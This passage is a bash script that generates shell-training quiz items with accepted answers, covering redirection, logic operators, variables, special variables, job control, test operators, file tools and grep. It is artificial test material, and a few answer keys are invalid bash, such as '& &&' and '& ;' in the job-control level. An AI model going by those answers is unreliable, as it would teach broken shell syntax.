  script=$(_pick SANDBOX_SCRIPTS); script2=$(_pick SANDBOX_SCRIPTS)
  ext=$(_phrase py sh log txt); ext2=$(_phrase conf ini yaml json)
  errfile=$(_phrase errors.log err.txt stderr.log error.out)
  errfile2=$(_phrase debug.err issue.log problem.txt err2.log)
  outfile=$(_phrase output.log out.txt all.log combined.out)
  outfile2=$(_phrase result.log full.txt complete.out run.log)
  log=$(_pick SANDBOX_LOGS)
  missing=$(_phrase old.log backup.txt archive.csv deleted.log)
  missing2=$(_phrase removed.txt gone.log lost.dat missing.cfg)

  # 2> = stderr to file
  questions+=("Save stderr from ${G}./${script}${C} to ${W}${errfile}${C} (use ${Y}2>${C})|./${script} 2> ${errfile}")
  questions+=("${G}cat${C} ${W}${missing}${C}, save error to ${W}${errfile}${C} (use ${Y}2>${C})|cat ${missing} 2> ${errfile}|~^cat [^ ]+ 2> ?${errfile}$")

  # 2> /dev/null = hide errors
  questions+=("Find ${Y}*.${ext}${C} files, hide errors (use ${Y}2> /dev/null${C})|find . -name '*.${ext}' 2> /dev/null|#output:*")
  questions+=("Run ${G}./${script}${C} but hide errors (use ${Y}2> /dev/null${C})|./${script} 2> /dev/null")

  # &> = both stdout+stderr
  questions+=("Capture stdout+stderr from ${G}./${script}${C} to ${W}${outfile}${C} (use ${Y}&>${C})|./${script} &> ${outfile}|./${script} > ${outfile} 2>&1")
  questions+=("Run ${G}./${script}${C} completely silently (use ${Y}&> /dev/null${C})|./${script} &> /dev/null|./${script} > /dev/null 2>&1")

  # 2>&1 = merge stderr into stdout
  questions+=("Run ${G}./${script}${C}, search ALL output for 'error'§./${script} 2>&1 | grep -i error§~^\\./[^ ]+ 2>&1 \\| grep")
  questions+=("Run ${G}./${script2}${C}, pipe all output to ${G}less${C}§./${script2} 2>&1 | less§#text:")
  questions+=("Run ${G}./${script}${C}, count total lines (stdout+stderr)§./${script} 2>&1 | wc -l§#output:~[0-9]+")

  # Separate files for stdout and stderr
  questions+=("Save output to ${W}${outfile}${C}, errors to ${W}${errfile}${C}|ls -la > ${outfile} 2> ${errfile}")
  questions+=("Run ${G}./${script}${C}: stdout to ${W}${outfile}${C}, stderr to ${W}${errfile}${C}|./${script} > ${outfile} 2> ${errfile}")
  questions+=("Separate ${G}./${script2}${C} output: results to ${W}${outfile2}${C}, errors to ${W}${errfile2}${C}|./${script2} > ${outfile2} 2> ${errfile2}")

  # 1>&2 = stdout to stderr (less common but useful)
  questions+=("Echo 'failed' to stderr (redirect stdout to stderr)|echo failed 1>&2|echo failed >&2|#text:")

  printf '%s\n' "${questions[@]}"
}

# Level 6: Logic Operators (&&, ||)
gen_level6() {
  local questions=() dir dir2 cfg cfg2 txt txt2 log msg msg2 script n; _ctx
  dir=$(_phrase temp backup new test work build output cache)
  dir2=$(_phrase archive old data staging release deploy results)
  cfg=$(_pick SANDBOX_CFGS); cfg2=$(_pick SANDBOX_CFGS)
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  log=$(_pick SANDBOX_LOGS)
  msg=$(_phrase exists failed done error warning success ok)
  msg2=$(_phrase ready complete skipped finished created started)
  script=$(_pick SANDBOX_SCRIPTS)
  n=$((RANDOM % 5 + 3))
  local term=$(_phrase ERROR WARN INFO DEBUG)

  # === PURE: Just && and || basics ===
  questions+=("Create ${W}${dir}${C} and cd into it (use ${Y}&&${C})|mkdir ${dir} && cd ${dir}")
  questions+=("Create ${W}${dir}${C} or echo '${msg}' if fails (use ${Y}||${C})§mkdir ${dir} || echo '${msg}'")
  questions+=("cd to ${W}${dir}${C}, create it if missing|cd ${dir} || mkdir ${dir}")

  # === COMPOUND: Uses cat (L2), head (L2), tail (L2) ===
  questions+=("If ${W}${txt}${C} exists, display it (use ${Y}&&${C})|test -f ${txt} && cat ${txt}|[[ -f ${txt} ]] && cat ${txt}")
  questions+=("If ${W}${log}${C} exists, show first ${n} lines|test -f ${log} && head -${n} ${log}|[[ -f ${log} ]] && head -${n} ${log}")
  questions+=("If ${W}${txt}${C} exists cat it, else echo '${msg}'§test -f ${txt} && cat ${txt} || echo '${msg}'§[[ -f ${txt} ]] && cat ${txt} || echo '${msg}'")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("If ${W}${log}${C} has ${Y}${term}${C}, show matching lines§grep -q ${term} ${log} && grep ${term} ${log}")
  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, or echo 'not found'§grep ${term} ${log} || echo 'not found'")
  questions+=("If ${W}${log}${C} contains ${Y}${term}${C}, count the matches§grep -q ${term} ${log} && grep -c ${term} ${log}")
  questions+=("Show ${Y}${term}${C} lines from ${W}${log}${C} if any, else show all§grep ${term} ${log} || cat ${log}")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Backup ${W}${cfg}${C} if it exists, then log success|test -f ${cfg} && cp ${cfg} ${cfg}.bak && echo done >> backup.log")
  questions+=("Copy ${W}${txt}${C} to backup and echo '${msg2}'|cp ${txt} ${txt}.bak && echo '${msg2}'")
  questions+=("Run ${G}./${script}${C} silently, echo success or failed§./${script} &>/dev/null && echo success || echo failed")
  questions+=("Run ${G}./${script}${C}, save output or log error§./${script} > output.txt || echo 'failed' >> errors.log")

  # === COMPOUND: Uses ls (L0), test + cat/head combo ===
  questions+=("If ${W}${dir}${C} exists, list contents|test -d ${dir} && ls ${dir}|[[ -d ${dir} ]] && ls ${dir}")
  questions+=("List ${W}${dir}${C} or create it if missing|ls ${dir} || mkdir ${dir}")
  questions+=("Create ${W}${dir}${C} and save listing to files.txt§mkdir -p ${dir} && ls ${dir} > files.txt")
  questions+=("If ${W}${cfg}${C} is readable, cat it; else echo 'denied'§test -r ${cfg} && cat ${cfg} || echo 'denied'§[[ -r ${cfg} ]] && cat ${cfg} || echo 'denied'")

  # === COMPOUND: Multi-step pipelines with logic ===
  questions+=("Check if ${W}${log}${C} has ${Y}${term}${C}, show first ${n} matches§grep -q ${term} ${log} && grep ${term} ${log} | head -${n}")
  questions+=("If ${W}${txt}${C} exists, sort and save to sorted.txt§test -f ${txt} && sort ${txt} > sorted.txt")
  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, save matches or echo 'none'§grep ${term} ${log} > matches.txt || echo 'none'")

  # === Semicolon: run commands sequentially regardless of exit status ===
  questions+=("Run pwd, ls, date in sequence (use ${Y};${C})|pwd ; ls ; date")
  questions+=("Create ${W}${dir}${C}, list it, show path (use ${Y};${C})|mkdir -p ${dir} ; ls ${dir} ; pwd")
  questions+=("Echo 'start', run ${G}./${script}${C}, echo 'end' (use ${Y};${C})|echo start ; ./${script} ; echo end")

  printf '%s\n' "${questions[@]}"
}

# Level 7: Variables & Substitution
gen_level7() {
  local questions=() txt txt2 log cfg var var2 var3 val val2 term n; _ctx
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  log=$(_pick SANDBOX_LOGS); cfg=$(_pick SANDBOX_CFGS)
  var=$(_phrase msg name data result value output status)
  var2=$(_phrase now time today count num lines)
  var3=$(_phrase tmp dir file path prefix backup)
  val=$(_phrase hello world test ready done success running active)
  val2=$(_phrase config debug enabled production staging offline)
  term=$(_phrase ERROR WARN INFO DEBUG); n=$((RANDOM % 5 + 3))

  # === PURE: Just variables and substitution basics ===
  questions+=("Store '${val}' in variable ${var}|${var}=${val}|${var}='${val}'")
  questions+=("$(_phrase "Print" "Echo" "Show") variable \$${var}|echo \$${var}")
  questions+=("Store date output in ${var2} (use ${Y}\$()${C})|${var2}=\$(date)")
  questions+=("Store hostname in variable (use ${Y}\$()${C})|${var}=\$(hostname)")
  questions+=("Print length of \$${var}|echo \${#${var}}")
  questions+=("Print \$${var} or 'default' if empty|echo \${${var}:-default}")

  # === COMPOUND: Uses wc/head/tail (L2), input redir (L4) ===
  questions+=("Store line count of ${W}${txt}${C} in variable|${var2}=\$(wc -l < ${txt})")
  questions+=("Store word count of ${W}${txt2}${C} in ${var2}|${var2}=\$(wc -w < ${txt2})")
  questions+=("Store first line of ${W}${log}${C} in ${var}|${var}=\$(head -1 ${log})")
  questions+=("Store last line of ${W}${log}${C} in ${var}|${var}=\$(tail -1 ${log})")
  questions+=("Show 'Lines:' with line count of ${W}${txt}${C}§echo \"Lines: \$(wc -l < ${txt})\"")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("Store count of ${Y}${term}${C} matches in ${var2}§${var2}=\$(grep -c ${term} ${log})")
  questions+=("Store first ${Y}${term}${C} line from ${W}${log}${C}§${var}=\$(grep ${term} ${log} | head -1)")
  questions+=("Count unique lines and store in variable§${var2}=\$(sort ${txt} | uniq | wc -l)")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Backup ${W}${txt}${C} with date suffix|cp ${txt} ${txt}.\$(date +%Y%m%d)")
  questions+=("Create dir named with today's date|mkdir \$(date +%Y-%m-%d)")
  questions+=("Save grep results, echo count found§grep ${term} ${log} > matches.txt && echo \"Found: \$(wc -l < matches.txt)\"")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("Check file exists, store line count or 0§${var2}=\$(test -f ${txt} && wc -l < ${txt} || echo 0)")
  questions+=("Store hostname, then echo if set§${var}=\$(hostname) && echo \"Host: \$${var}\"")

  # === COMPOUND: Complex substitution chains ===
  questions+=("Print today's date inline|echo \"Today is \$(date +%Y-%m-%d)\"")
  questions+=("Echo 'User is' followed by username|echo \"User is \$(whoami)\"")
  questions+=("Print hostname and current directory§echo \"Host: \$(hostname), Dir: \$(pwd)\"")
  questions+=("Show file info: name, lines, words§echo \"${txt}: \$(wc -l < ${txt}) lines, \$(wc -w < ${txt}) words\"")

  # === COMPOUND: Variable with earlier skills ===
  questions+=("Store sorted unique lines in variable§${var}=\$(sort -u ${txt})")
  questions+=("Store first ${n} lines of ${W}${log}${C}|${var}=\$(head -${n} ${log})")
  questions+=("Echo path: /home/\$USER|echo \"/home/\$USER\"")

  # === export and unset ===
  questions+=("Export ${var} for child processes|export ${var}|export ${var}=${val}")
  questions+=("Set and export ${var2} in one command|export ${var2}='${val2}'")
  questions+=("Remove variable ${var} (use ${Y}unset${C})|unset ${var}")
  questions+=("Show all exported variables|export|env")

  printf '%s\n' "${questions[@]}"
}

# Level 8: Special Variables ($$, $?, $!)
gen_level8() {
  local questions=() n n2 script log txt; _ctx
  n=$((RANDOM % 3 + 2)); n2=$((RANDOM % 4 + 3))
  script=$(_pick SANDBOX_SCRIPTS); log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
  local term=$(_phrase ERROR WARN INFO)

  # === PURE: Special variables basics ===
  questions+=("Print current shell PID (use ${Y}\$\$${C})|echo \$\$")
  questions+=("Print PID of last background process (use ${Y}\$!${C})|echo \$!")
  questions+=("Print exit status of last command (use ${Y}\$?${C})|echo \$?")
  questions+=("Print number of script arguments (use ${Y}\$#${C})|echo \$#")
  questions+=("Print all script arguments (use ${Y}\$@${C})|echo \"\$@\"")
  questions+=("Print script name (use ${Y}\$0${C})|echo \$0")
  questions+=("Print first argument (use ${Y}\$1${C})|echo \$1")
  questions+=("Print random number (use ${Y}\$RANDOM${C})|echo \$RANDOM")

  # === COMPOUND: Uses && || (L6) with exit status ===
  questions+=("Run grep, check exit status if found§grep -q ${term} ${log} ; echo \$?")
  questions+=("Run command, echo 'success' if \$? is 0§ls && echo 'exit: '\$?")
  questions+=("Test if last command succeeded (exit 0)|[[ \$? -eq 0 ]] && echo success")

  # === COMPOUND: Uses variables (L7) with special vars ===
  questions+=("Store exit status in variable, then check it§status=\$? ; [[ \$status -eq 0 ]] && echo ok")
  questions+=("Store PID in variable for later use|mypid=\$\$")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Log exit status after command§grep ${term} ${log} ; echo \$? >> status.log")
  questions+=("Print 'failed' to stderr using exit status check§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed >&2")

  # === COMPOUND: Environment variables with commands ===
  questions+=("List files in home directory using \$HOME|ls \$HOME")
  questions+=("Create file in home using \$HOME|touch \$HOME/test.txt")
  questions+=("Search in user's home for ${Y}${term}${C}§grep -r ${term} \$HOME 2>/dev/null | head -5")
  questions+=("Show user and hostname together|echo \"\$USER@\$HOSTNAME\"")

  # === COMPOUND: Using $RANDOM ===
  questions+=("Create file with random name|touch file_\$RANDOM.txt")
  questions+=("Pick random line from ${W}${txt}${C}§head -\$((RANDOM % \$(wc -l < ${txt}) + 1)) ${txt} | tail -1")

  printf '%s\n' "${questions[@]}"
}

# Level 9: Job Control (&, jobs, bg, fg)
gen_level9() {
  local questions=() n n2 n3 script script2 log outfile errfile txt term; _ctx
  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 3 + 1)); n3=$((RANDOM % 60 + 30))
  script=$(_pick SANDBOX_SCRIPTS); script2=$(_pick SANDBOX_SCRIPTS)
  log=$(_pick SANDBOX_LOGS); txt=$(_pick SANDBOX_TXTS)
  outfile=$(_phrase output.log results.txt run.log process.out)
  errfile=$(_phrase errors.log err.txt debug.log)
  term=$(_phrase ERROR WARN INFO)

  # === PURE: Just & and job control basics ===
  questions+=("Run sleep ${n} in background (use ${Y}&${C})|sleep ${n} &")
  questions+=("Run ${W}${script}${C} in background (use ${Y}&${C})|./${script} &")
  questions+=("$(_phrase "List" "Show" "View") background jobs|jobs")
  questions+=("Bring job ${n2} to foreground|fg %${n2}|fg ${n2}")
  questions+=("$(_phrase "Send" "Move" "Put") job ${n2} to background|bg %${n2}|bg ${n2}")
  questions+=("Kill job ${n2}|kill %${n2}")
  questions+=("$(_phrase "Wait for" "Wait until") all background jobs finish|wait")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Run ${W}${script}${C} in background, save stdout to ${W}${outfile}${C}|./${script} > ${outfile} &")
  questions+=("Run ${W}${script2}${C} in background, capture all output|./${script2} &> ${outfile} &|./${script2} > ${outfile} 2>&1 &")
  questions+=("Run ${W}${script}${C} in background, separate stdout and stderr|./${script} > ${outfile} 2> ${errfile} &")
  questions+=("Run ${W}${script}${C} silently in background|./${script} &>/dev/null &|./${script} >/dev/null 2>&1 &")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("Run ${W}${script}${C} in background and echo 'started'|./${script} & && echo started")
  questions+=("Wait for all jobs, then echo 'done'|wait && echo done")
  questions+=("Kill job ${n2}, echo 'killed' on success|kill %${n2} && echo killed")

  # === COMPOUND: Uses special vars (L8) with job control ===
  questions+=("Run ${W}${script}${C} in background, save its PID§./${script} & ; echo \"PID: \$!\"")
  questions+=("Start sleep in background, show PID|sleep 60 & ; echo \$!")
  questions+=("Run in background and wait for it by PID§./${script} & pid=\$! ; wait \$pid")
  questions+=("Save PID to file after starting background job§./${script} & ; echo \$! > pid.txt")

  # === COMPOUND: Uses cat/grep (L2, L3) with job control ===
  questions+=("Run ${W}${script}${C} in background, later grep its output§./${script} > ${outfile} & ; sleep 1 ; grep ${term} ${outfile}")
  questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &")
  questions+=("Run grep in background, save matches|grep ${term} ${log} > matches.txt &")

  # === COMPOUND: Advanced job control ===
  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
  questions+=("Wait for job ${n2} specifically|wait %${n2}")
  questions+=("Bring most recent job to foreground|fg|fg %")
  questions+=("Continue stopped job in background|bg")

  printf '%s\n' "${questions[@]}"
}

# Level 10: Test Operators ([[ -f ]], [[ -d ]], etc)
gen_level10() {
  local questions=() txt txt2 cfg cfg2 log script dir dir2 n n2 n3 term; _ctx
  txt=$(_pick SANDBOX_TXTS); txt2=$(_pick SANDBOX_TXTS)
  cfg=$(_pick SANDBOX_CFGS); cfg2=$(_pick SANDBOX_CFGS)
  log=$(_pick SANDBOX_LOGS); script=$(_pick SANDBOX_SCRIPTS)
  dir=$(_phrase src data logs backup); dir2=$(_phrase temp cache build output)
  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 50 + 5)); n3=$((RANDOM % 5 + 3))
  term=$(_phrase ERROR WARN INFO DEBUG)

  # === PURE: Test operator basics ===
  questions+=("Test if ${W}${txt}${C} exists and is a file|[[ -f ${txt} ]]|test -f ${txt}")
  questions+=("Test if ${W}${dir}${C} exists and is a directory|[[ -d ${dir} ]]|test -d ${dir}")
  questions+=("Test if ${W}${txt}${C} is readable|[[ -r ${txt} ]]|test -r ${txt}")
  questions+=("Test if ${W}${script}${C} is executable|[[ -x ${script} ]]|test -x ${script}")
  questions+=("Test if ${W}${txt}${C} is non-empty|[[ -s ${txt} ]]|test -s ${txt}")
  questions+=("Test if \$var is empty|[[ -z \"\$var\" ]]")
  questions+=("Test if \$var is NOT empty|[[ -n \"\$var\" ]]")
  questions+=("Test if \$num is greater than ${n}|[[ \$num -gt ${n} ]]")

  # === COMPOUND: Uses cat (L2) ===
  questions+=("If ${W}${txt}${C} is readable, display it|[[ -r ${txt} ]] && cat ${txt}")
  questions+=("If ${W}${cfg}${C} exists and readable, show with line numbers|[[ -f ${cfg} && -r ${cfg} ]] && cat -n ${cfg}")

  # === COMPOUND: Uses head/tail (L2) ===
  questions+=("If ${W}${log}${C} exists, show first ${n3} lines|[[ -f ${log} ]] && head -${n3} ${log}")
  questions+=("If ${W}${log}${C} has content, show last ${n3} lines|[[ -s ${log} ]] && tail -${n3} ${log}")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("If ${W}${log}${C} exists, search for ${Y}${term}${C}|[[ -f ${log} ]] && grep ${term} ${log}")
  questions+=("If ${W}${log}${C} is non-empty, count ${Y}${term}${C} matches|[[ -s ${log} ]] && grep -c ${term} ${log}")
  questions+=("Test if ${W}${log}${C} contains ${Y}${term}${C}§[[ -f ${log} ]] && grep -q ${term} ${log}")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("If ${W}${txt}${C} is writable, append timestamp|[[ -w ${txt} ]] && date >> ${txt}")
  questions+=("If ${W}${script}${C} is executable, run and log output|[[ -x ${script} ]] && ./${script} > output.log 2>&1")
  questions+=("Test if ${W}${dir}${C} exists, create if not|[[ -d ${dir} ]] || mkdir -p ${dir}")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("If ${W}${txt}${C} exists cat it, else echo 'missing'§[[ -f ${txt} ]] && cat ${txt} || echo 'missing'")
  questions+=("If ${W}${cfg}${C} is writable, backup it and echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo done")
  questions+=("Check file exists or exit with error§[[ -f ${txt} ]] || { echo 'not found' >&2; exit 1; }")

  # === COMPOUND: Numeric tests with variables (L8) ===
  questions+=("If line count > ${n2}, show first ${n3} lines§lines=\$(wc -l < ${txt}); [[ \$lines -gt ${n2} ]] && head -${n3} ${txt}")
  questions+=("Test if ${W}${txt}${C} has more than ${n2} words§[[ \$(wc -w < ${txt}) -gt ${n2} ]]")

  # === Combined/advanced tests ===
  questions+=("Test if ${W}${txt}${C} exists AND is readable|[[ -f ${txt} && -r ${txt} ]]")
  questions+=("Test if ${W}${txt}${C} OR ${W}${cfg}${C} exists§[[ -f ${txt} || -f ${cfg} ]]")
  questions+=("Test if ${W}${txt}${C} does NOT exist|[[ ! -f ${txt} ]]|test ! -f ${txt}")
  questions+=("Test if ${W}${txt}${C} is newer than ${W}${cfg}${C}|[[ ${txt} -nt ${cfg} ]]")

  printf '%s\n' "${questions[@]}"
}

# Level 11: Core File Tools
gen_level11() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local perm1=$((RANDOM % 8))$((RANDOM % 8))$((RANDOM % 8))
  local searchterm=$(_phrase ERROR WARN INFO DEBUG)

  # === PURE: Basic file operations ===
  questions+=("Display ${cfg} contents (use ${Y}cat${C})|cat ${cfg}|bat ${cfg}")
  questions+=("Display ${log} with line numbers (use ${Y}cat${C})|cat -n ${log}|bat -n ${log}")
  questions+=("Display ${txt} and ${txt2} together (use ${Y}cat${C})|cat ${txt} ${txt2}")

  # Listing files
  questions+=("Long listing with permissions, size, date (use ${Y}ls${C})|ls -l|ls -la|eza -l")
  questions+=("List all files including hidden (use ${Y}ls${C})|ls -la|ls -al|eza -la|eza -al")
  questions+=("List sorted by size, largest first (use ${Y}ls${C})|ls -lS|ls -Sl|eza -l --sort size -r")
  questions+=("List sorted by time, newest first (use ${Y}ls${C})|ls -lt|ls -tl|eza -l --sort modified")
  questions+=("List only directories (use ${Y}ls${C})|ls -d */|eza -D")
  questions+=("Show directory tree (use ${Y}tree${C})|tree|eza -T")
  questions+=("Tree ${n3} levels deep (use ${Y}tree${C})|tree -L ${n3}|eza -T -L ${n3}")
  questions+=("Long listing with human sizes (use ${Y}ls${C})|ls -lh|ls -hl|eza -lh")
  questions+=("List one file per line (use ${Y}ls${C})|ls -1")
  questions+=("List ${dir}/ recursively (use ${Y}ls${C})|ls -R ${dir}/|eza -R ${dir}/")

  # Head and tail
  questions+=("First ${n1} lines of ${W}${log}${C} (use ${Y}head${C})|head -n ${n1} ${log}|head -${n1} ${log}")
  questions+=("Last ${n2} lines of ${W}${log}${C} (use ${Y}tail${C})|tail -n ${n2} ${log}|tail -${n2} ${log}")

  # File operations
  questions+=("Count lines in ${csv} (use ${Y}wc${C})|wc -l ${csv}|wc -l < ${csv}")
  questions+=("Count words in ${txt} (use ${Y}wc${C})|wc -w ${txt}")
  questions+=("Count bytes in ${txt} (use ${Y}wc${C})|wc -c ${txt}")
  questions+=("Copy ${cfg} to ${cfg2} (use ${Y}cp${C})|cp ${cfg} ${cfg2}")
  questions+=("Copy ${dir}/ recursively to ${dir2}/ (use ${Y}cp${C})|cp -r ${dir}/ ${dir2}/|cp -R ${dir}/ ${dir2}/")
  questions+=("Move ${txt} to ${dir}/ (use ${Y}mv${C})|mv ${txt} ${dir}/")
  questions+=("Rename ${cfg} to ${cfg2} (use ${Y}mv${C})|mv ${cfg} ${cfg2}")

  # Disk usage
  questions+=("Disk usage of current dir, human readable (use ${Y}du${C})|du -sh .|du -hs .|dust")
  questions+=("Disk usage of each subdir (use ${Y}du${C})|du -sh */|du -hs */|dust -d 1")
  questions+=("Disk free space (use ${Y}df${C})|df -h")

  # Archives (tar)
  questions+=("Extract ${archive} (use ${Y}tar${C})|tar xzf ${archive}|tar -xzf ${archive}")
  questions+=("Extract ${archive} to ${dir}/ (use ${Y}tar${C})|tar xzf ${archive} -C ${dir}/|tar -xzf ${archive} -C ${dir}/")
  questions+=("Create archive.tar.gz from ${dir}/ (use ${Y}tar${C})|tar czf archive.tar.gz ${dir}/|tar -czf archive.tar.gz ${dir}/")
  questions+=("List contents of ${archive} without extracting (use ${Y}tar${C})|tar tzf ${archive}|tar -tzf ${archive}|tar tf ${archive}")

  # Symlinks
  questions+=("Create symlink 'link' pointing to ${cfg}|ln -s ${cfg} link")
  questions+=("Create symlink 'link' to ${cfg} using absolute path|ln -s \$(pwd)/${cfg} link")
  questions+=("$(_phrase "Show" "Display" "Print") where symlink points|readlink link|ls -l link")
  questions+=("Remove symlink (not target)|rm link|unlink link")
  questions+=("Create hard link 'hardlink' pointing to ${txt}|ln ${txt} hardlink")
  questions+=("Follow symlink to find real path|readlink -f link")

  # Permissions - dynamic octal modes
  questions+=("Make ${script} executable|chmod +x ${script}")
  questions+=("Set ${script} to rwxr-xr-x (755)|chmod 755 ${script}")
  questions+=("Set ${cfg} to rw-r--r-- (644)|chmod 644 ${cfg}")
  questions+=("Set permissions to ${perm1}|chmod ${perm1} ${txt}")
  questions+=("Add write permission for group|chmod g+w ${cfg}")
  questions+=("Remove all permissions for others|chmod o-rwx ${cfg}|chmod o= ${cfg}")
  questions+=("Make ${dir}/ and contents readable by all|chmod -R a+r ${dir}/")
  questions+=("Set read-only for everyone|chmod a-w ${txt}|chmod 444 ${txt}")
  questions+=("Copy permissions from ${cfg} to ${txt}|chmod --reference=${cfg} ${txt}")

  # === COMPOUND: Uses grep (L3), pipes (L3), logic (L6) ===
  questions+=("If ${W}${log}${C} exists, show lines with ${Y}${searchterm}${C}§[[ -f ${log} ]] && grep ${searchterm} ${log}")
  questions+=("Copy ${W}${cfg}${C} to backup and verify§cp ${cfg} ${cfg}.bak && diff ${cfg} ${cfg}.bak")
  questions+=("Create ${W}${dir}${C}, then list its contents|mkdir -p ${dir} && ls -la ${dir}")
  questions+=("Count ${Y}${searchterm}${C} in ${W}${log}${C} if exists§[[ -f ${log} ]] && grep -c ${searchterm} ${log}")
  questions+=("Extract ${W}${archive}${C} and list contents§tar xzf ${archive} && ls -la")
  questions+=("Copy ${W}${txt}${C} to ${W}${dir}${C}/ and echo done|cp ${txt} ${dir}/ && echo done")

  printf '%s\n' "${questions[@]}"
}

# Level 14: Text Search (grep, rg)
gen_level14() {
  local questions=() log log2 cfg cfg2 txt txt2 csv csv2 dir dir2 ext ext2 script archive bin img pcap hash photo wordlist ip subnet port port2 mac url user host term term2 term3 field field2 key old new size iface proc svc sig branch time n1 n2 n3 col; _ctx
  local ctx=$(_rnum 1 10) ctx2=$(_rnum 2 5)

  # Basic grep - with flag order alternatives
  questions+=("Search for '${term}' recursively (use ${Y}grep${C})|grep -r ${term}|grep -r ${term} .|rg ${term}")
  questions+=("Case-insensitive search for '${term}' (use ${Y}grep${C})|grep -ri ${term}|grep -ir ${term}|rg -i ${term}")
  questions+=("Search '${term}' with line numbers (use ${Y}grep${C})|grep -rn ${term}|grep -nr ${term}|rg -n ${term}")
  questions+=("Count '${term}' matches in ${log} (use ${Y}grep${C})|grep -c ${term} ${log}|rg -c ${term} ${log}")
  questions+=("Search '${term}' with ${ctx} lines context|grep -C ${ctx} ${term}|rg -C ${ctx} ${term}")
  questions+=("Show ${ctx2} lines before each '${term}' match|grep -B ${ctx2} ${term}|rg -B ${ctx2} ${term}")
  questions+=("Show ${ctx} lines after each '${term}' match|grep -A ${ctx} ${term}|rg -A ${ctx} ${term}")

  # Filtering - more variations
  questions+=("$(_phrase "List" "Show") only filenames containing '${term}'|grep -rl ${term}|grep -lr ${term}|rg -l ${term}")
  questions+=("Lines WITHOUT '${term}' in ${log}|grep -v ${term} ${log}|rg -v ${term} ${log}")
  questions+=("Search '${term}' in .${ext} files only|grep -r --include='*.${ext}' ${term}|rg -t ${ext} ${term}|rg -g '*.${ext}' ${term}")
  questions+=("Search '${term}' in .${ext} and .${ext2} files|grep -r --include='*.${ext}' --include='*.${ext2}' ${term}|rg -t ${ext} -t ${ext2} ${term}")
  questions+=("Search '${term}' excluding .git directory|grep -r --exclude-dir=.git ${term}|rg ${term} -g '!.git'")
  questions+=("Search '${term}' excluding ${dir}/ directory|grep -r --exclude-dir=${dir} ${term}|rg ${term} -g '!${dir}'")
  questions+=("Search '${term}' in ${dir}/ only|grep -r ${term} ${dir}/|rg ${term} ${dir}/")

  # Regex patterns - more variety
  questions+=("Find lines starting with '${term}'|grep -r '^${term}'|rg '^${term}'")
  questions+=("Find lines ending with '${term}'|grep -r '${term}\$'|rg '${term}\$'")
  questions+=("Find lines containing ONLY '${term}'|grep -rx '${term}'|rg -x '${term}'")
  questions+=("Find phone pattern XXX-XXX-XXXX|grep -E '[0-9]{3}-[0-9]{3}-[0-9]{4}'|rg '\\d{3}-\\d{3}-\\d{4}'")
  questions+=("Find IP addresses in ${log}|grep -oE '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' ${log}|rg -o '\\d+\\.\\d+\\.\\d+\\.\\d+' ${log}")
  questions+=("Find email addresses|grep -rE '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}'|rg '[\\w.+-]+@[\\w.-]+\\.[a-z]{2,}'")
  questions+=("Find URLs in ${log}|grep -oE 'https?://[^ ]+' ${log}|rg -o 'https?://\\S+' ${log}")
  questions+=("Find lines with numbers|grep -E '[0-9]+' ${txt}|rg '\\d+' ${txt}")
  questions+=("Find hex values (0x...)|grep -E '0x[0-9a-fA-F]+' ${log}|rg '0x[0-9a-fA-F]+' ${log}")

  # Literal search
  questions+=("Literal search 'func()' (no regex)|grep -F 'func()' ${txt}|rg -F 'func()' ${txt}")
  questions+=("Search for literal '[ERROR]' in ${log}|grep -F '[ERROR]' ${log}|rg -F '[ERROR]' ${log}")
  questions+=("Search for literal '\$HOME' in ${txt}|grep -F '\$HOME' ${txt}|rg -F '\$HOME' ${txt}")

  # Word boundaries
  questions+=("Match whole word '${term}' only|grep -rw ${term}|grep -wr ${term}|rg -w ${term}")

  # Multiple patterns
  questions+=("Find lines with '${term}' OR '${term2}'§grep -rE '${term}|${term2}'§rg '${term}|${term2}'")
  questions+=("Find lines with '${term}', '${term2}', OR '${term3}'§grep -rE '${term}|${term2}|${term3}'§rg '${term}|${term2}|${term3}'")
  questions+=("Find lines with both '${term}' AND '${term2}'§grep -r ${term} | grep ${term2}§rg ${term} | rg ${term2}")
  questions+=("Search for pattern from file patterns.txt|grep -rf patterns.txt|rg -f patterns.txt")

  # Output control
  questions+=("Show only matched text, not whole line|grep -o ${term} ${log}|rg -o ${term} ${log}")
  questions+=("Quiet mode (exit code only, no output)|grep -q ${term} ${log}|rg -q ${term} ${log}")
  questions+=("Colorize output|grep --color=always ${term}|rg --color=always ${term}")

  # === COMPOUND: Uses pipes (L3), head/tail (L2), sort/uniq (L16), logic (L6) ===
  questions+=("Find ${Y}${term}${C} in ${W}${log}${C}, show first ${ctx} matches§grep ${term} ${log} | head -${ctx}")
  questions+=("Count ${Y}${term}${C} lines and show sorted unique§grep ${term} ${log} | sort | uniq -c | sort -rn")
  questions+=("If ${Y}${term}${C} found, count matches; else echo 'none'§grep -q ${term} ${log} && grep -c ${term} ${log} || echo 'none'")
